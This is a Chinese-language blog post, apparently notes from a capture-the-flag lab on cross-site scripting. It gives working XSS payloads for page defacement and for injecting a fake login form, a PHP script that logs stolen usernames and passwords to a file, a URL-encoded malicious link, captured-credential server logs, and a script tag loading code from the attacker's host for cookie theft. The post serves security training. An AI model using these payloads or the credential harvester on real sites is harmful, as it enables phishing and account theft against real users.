---
title: "跨站脚本攻击"
published: 2026-06-15
updated: 2026-06-15
draft: false
description: "https://github.com/payload-box/xss-payload-list"
image: ""
tags:
  - XSS
category: 网络安全
pinned: false
comment: true
author: Ziddzide
---

# xss有效载荷列表

```
https://github.com/payload-box/xss-payload-list

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master
```

# xss漏洞利用

## 针对网站

### 更改背景

```js
<script>document.body.style.background = "#141d2b"</script> #挂黑页
```
### 修改页面标题

```
<script>document.title = 'ziddzide'</script>
```

### 更改页面文本

```
document.getElementById("todo").innerHTML = "New Text"

$("#todo").html('New Text'); #利用jQuery
```

## 网络钓鱼

### 登录表单注入

```
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

### 窃取cookie

```
当受害者尝试登录我们注入的登录表单时，我们会窃取他们的登录凭据。如果您尝试登录该表单，很可能会收到错误提示This site can’t be reached。这是因为，正如前面提到的，我们的 HTML 表单被设计成将登录请求发送到我们的 IP 地址，而该 IP 地址应该处于监听连接的状态。如果我们没有监听连接，就会收到site can’t be reached错误提示。
```

# 尝试找到上述服务器上“/phishing”路径下图片URL表单的有效XSS攻击载荷，然后利用本节所学知识准备一个注入恶意登录表单的恶意URL。接着访问“/phishing/send.php”将该URL发送给受害者，受害者将登录该恶意登录表单。如果一切操作正确，你应该会收到受害者的登录凭据，你可以使用这些凭据登录“/phishing/login.php”并获取flag。

在线图像显示器的基本注入结构

```
http://10.129.234.166/phishing/?url=1
```

利用上述代码就可以构造出一个恶意表单出来

```
document.write('<h3>Please login to continue</h3><form action=http://172.24.126.13><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

但是页面会出现很多意料之外的错误显示，添加

```
document.getElementById('urlform').remove();
```

取消上方的url图像显示错误;

继续添加`<!--`注释掉因为攻击移除的字符

则最后的payload为：

```
'><script>document.write('<h3>Please login to continue</h3><form action=http://172.24.126.13:80/server.php><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--
```

需要在攻击机上搭建一个php服务器，因为是连接了VPN否则不可能直接连接我内网的机器,这里重定向到登录页面盗窃凭据

```
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/login.php");
    fclose($file);
    exit();
}
?>
```

开启服务器监听

```
sudo php -S 0.0.0.0:80
```

收到

```
[Mon Jun 15 20:29:55 2026] 172.24.112.1:63075 Accepted
[Mon Jun 15 20:29:55 2026] 172.24.112.1:63075 [302]: GET /server.php?username=kobe&password=123456&submit=Login
[Mon Jun 15 20:29:55 2026] 172.24.112.1:63075 Closing
```

所以恶意url是：

```
http://10.129.45.113/phishing/?url=%27%3E%3Cscript%3Edocument.write(%27%3Ch3%3EPlease%20login%20to%20continue%3C/h3%3E%3Cform%20action=http://172.24.126.13:80/server.php%3E%3Cinput%20type=%22username%22%20name=%22username%22%20placeholder=%22Username%22%3E%3Cinput%20type=%22password%22%20name=%22password%22%20placeholder=%22Password%22%3E%3Cinput%20type=%22submit%22%20name=%22submit%22%20value=%22Login%22%3E%3C/form%3E%27);document.getElementById(%27urlform%27).remove();%3C/script%3E%3C!--
```

转到send.php发送，不过发送失败了，我验证了几次，这个其实和我的环境有关，在这里我使用的是kali wsl，但是vpn是在Windows上的，导致还有一层虚拟网关，正向连接可以连接到HTB，但是HTB找不到我，其实蛮有意思的，攻击企业服务器也是一样的道理，企业服务器在内网不好探查，连接不到，所以需要服务器主动出网，还有一个原因是出站宽松，入站严格。

# 尝试重复本节中学到的知识，找出存在漏洞的输入字段，找到有效的 XSS 有效载荷，然后使用“会话劫持”脚本获取管理员 cookie，并在“login.php”中使用它来获取 flag。

新开的路径，先看看dalfox漏扫

```
dalfox url "http://10.129.234.166/hijacking/?fullname=111&username=222&password=333&email=444%40qq.com&imgurl=111"
```

没扫到，但是可以大胆推测在最后一个表单提交里，构造一个url看看php服务器有没有返回

```
"><script src=http://172.24.126.13></script>
```

其实到这里之后只需要构造一个js脚本获得cookie即可，但是之后的环节需要在我设置好kali wsl的VPN后才有可能补全
